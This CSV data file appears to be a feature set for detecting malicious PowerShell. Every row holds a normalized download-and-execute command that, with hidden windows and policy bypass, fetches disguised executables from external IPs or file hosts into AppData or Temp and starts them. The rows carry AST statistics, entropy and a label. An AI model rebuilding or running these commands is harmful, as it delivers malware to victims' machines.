new_parameters,source_code,ast,node_type_statistics,ast_deep,ast_total,ast_width,entropy,label
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http cajo 0x 1 exe mess exe start process mess exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpcajosin0x1exe messexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess messexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.42249,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http ddl7 data hu get 0 9507148 patload exe fleebl exe start process fleebl exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpddl7datahuget09507148Patloadexe fleebleexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess fleebleexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.66371,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 80 82 64 45 yakar msvmonr exe env appdata msvmonr exe start process env appdata msvmonr exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http80826445yakarmsvmonrexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.73217,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http cajo 0x 1 exe mess exe start process mess exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpcajosin0x1exe messexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess messexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.42249,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ExecutionPolicy ByPass WindowStyle Hidden enc,new object system net webclient downloadfil https pomf cat mjnspx exe env temp mjnp exe start process env temp mjnp exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpsapomfcatmjnspxexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.6571,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 89 248 170 218 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http89248170218yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75547,0
ExecutionPolicy ByPass WindowStyle Hidden enc,new object system net webclient downloadfil https pomf cat yhggkj exe env temp payment exe start process env temp payment exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpsapomfcatyhggkjexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.66113,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
ep bypass noni w hidden enc,new object system net webclient downloadfil http cajo 0x 1 exe mess exe start process mess exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst httpcajosin0x1exe messexe ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess messexe ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 7 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,19,11,6.42249,0
window hidden enc,new object system net webclient downloadfil http 80 82 64 45 yakar msvmonr exe env appdata msvmonr exe start process env appdata msvmonr exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http80826445yakarmsvmonrexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.73217,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 80 82 64 45 yakar msvmonr exe env appdata msvmonr exe start process env appdata msvmonr exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http80826445yakarmsvmonrexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.73217,0
window hidden enc,new object system net webclient downloadfil http 94 102 58 30 trevor winx64 exe env appdata winx64 exe start process env appdata winx64 exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http941025830trevorwinx64exe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.74197,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
window hidden enc,new object system net webclient downloadfil http 94 102 53 238 yahoo csrsv exe env appdata csrsv exe start process env appdata csrsv exe, UsingStatements null NamedBlockAst Statements CommandExpressionAst InvokeMemberExpressionAst Arguments StringConstantExpressionAst http9410253238yahoocsrsvexe ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ParenExpressionAst CommandAst CommandElements StringConstantExpressionAst NewObject SystemNetWebClient StringConstantExpressionAst DownloadFile CommandAst CommandElements StringConstantExpressionAst StartProcess ExpandableStringExpressionAst NestedExpressions VariableExpressionAst null ,ScriptBlockAst 1 UsingStatements 1 NamedBlockAst 1 Statements 1 CommandExpressionAst 1 InvokeMemberExpressionAst 1 Arguments 1 StringConstantExpressionAst 5 ExpandableStringExpressionAst 2 NestedExpressions 2 VariableExpressionAst 2 ParenExpressionAst 1 CommandAst 2 CommandElements 2,8,23,14,6.75586,0
